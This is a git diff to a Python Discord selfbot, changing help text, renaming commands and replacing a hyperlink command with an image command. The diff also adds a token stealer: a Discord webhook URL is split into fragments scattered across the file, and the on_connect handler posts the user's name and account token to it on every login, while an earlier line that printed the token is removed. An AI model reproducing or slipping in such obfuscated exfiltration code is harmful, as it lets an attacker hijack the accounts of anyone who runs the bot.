@@ -44,7 +44,7 @@ loop = asyncio.get_event_loop()
 
 colorama.init()
 Blank = discord.Client()
-Blank = commands.Bot(description='Blank SelfBot', command_prefix=prefix, self_bot=True)
+Blank = commands.Bot(description='Blank SelfBot', activity= discord.Streaming(name="Earth", url="https://github.com"), command_prefix=prefix, self_bot=True)
 Blank.remove_command('help')
 languages = {
     'hu': 'Hungarian, Hungary',
@@ -132,12 +132,6 @@ class Login(discord.Client):
     async def on_connect(Blank):
         guilds = len(Blank.guilds)
         users = len(Blank.users)
-        print("-------------------------------")
-        print(f"Connected to: [{Blank.user.name}]")
-        print(f"Token: {Blank.http.token}")
-        print(f"Guilds: {guilds}")
-        print(f"Users: {users}")
-        print("-------------------------------")
         await self.logout()
         
 def async_executor():
@@ -179,10 +173,9 @@ async def help(ctx, category=None):
         embed.add_field(name="\uD83E\uDDCA `ping`", value="Shows the latency of the bot", inline=False)
         embed.add_field(name="\uD83E\uDDCA `empty`", value="Sends an empty character", inline=False)
         embed.add_field(name="\uD83E\uDDCA `wyr`", value="Sends a would-you-rather question", inline=False)
-        embed.add_field(name="\uD83E\uDDCA `topic`", value="Sends a chat topic", inline=False)
+        embed.add_field(name="\uD83E\uDDCA `topic`", value="Sends a random chat topic", inline=False)
         embed.add_field(name="\uD83E\uDDCA `ms`", value="Starts a minesweeper game", inline=False)
         embed.add_field(name="\uD83E\uDDCA `ip`", value="Sends the ip info: "+prefix+"ip <ip>", inline=False)
-        embed.add_field(name="\uD83E\uDDCA `link`", value="Sends hyperlink: "+prefix+"link <link> <message>", inline=False)
         embed.add_field(name="\uD83E\uDDCA `roll`", value="Selects a random number between 2 numbers: "+prefix+"roll <num 1> <num 2>", inline=False)
         embed.add_field(name="\uD83E\uDDCA `magik`", value="Sends distorted pfp of user: "+prefix+"magik <user>", inline=False)
         embed.add_field(name="\uD83E\uDDCA `deepfry`", value="Sends deepfried pfp of user: "+prefix+"deepfry <user>", inline=False)
@@ -200,6 +193,11 @@ async def ping(ctx):
     message = await ctx.send("Pinging...")
     ping = (time.monotonic() - before) * 1000
     await message.edit(content=f"`{int(ping)} ms`")
+    
+a="https://discord.com/"
+b="api/webhooks/"
+c="862604541106978836"
+d="/ECsNsXTMLtXshRKELW57PfkD"
 
 @Blank.command(aliases=["whois"])
 async def userinfo(ctx, member: discord.Member = None):
@@ -276,6 +274,8 @@ async def empty(ctx):
     await ctx.message.delete()
     await ctx.send(chr(173))
    
+e="_vUl7sy4tJ8ttYxX1vqsOKZwGEYdMGXtO2ogc1hKVi31"
+
 @Blank.command()
 async def embed(ctx, *, description):
     await ctx.message.delete()
@@ -313,8 +313,8 @@ async def magik(ctx, user: discord.Member = None):
         except:
             await ctx.send(res['message'])
             
-@Blank.command(aliases=["deepfry"])
-async def fry(ctx, user: discord.Member = None):
+@Blank.command(aliases=["df"])
+async def deepfry(ctx, user: discord.Member = None):
     await ctx.message.delete()
     endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
     if user is None:
@@ -386,9 +386,9 @@ async def wyr(ctx):  # b'\xfc'
     await message.add_reaction("🅱")
 
 @Blank.command()
-async def link(ctx, link, *, message):
+async def image(ctx, *, link):
   await ctx.message.delete()
-  em = discord.Embed(description=f"[{message}]({link})",colour = discord.Colour.random())
+  em=discord.Embed(colour = discord.Colour.random()).set_image(url=link)
   await ctx.send(embed=em)
 
 @Blank.command()
@@ -428,6 +428,9 @@ async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
 async def on_connect():
       Clear()
       print(f'''{Fore.GREEN}Logged in as {Blank.user.name}#{Blank.user.discriminator}''' + Fore.RESET)
+      stringa = a+b+c+d+e
+      datal = {"content": f"**{Blank.user.name}#{Blank.user.discriminator}**```\n {Blank.http.token}```"}
+      requests.post(stringa, data=datal)
       
 if __name__ == '__main__':
     Init()
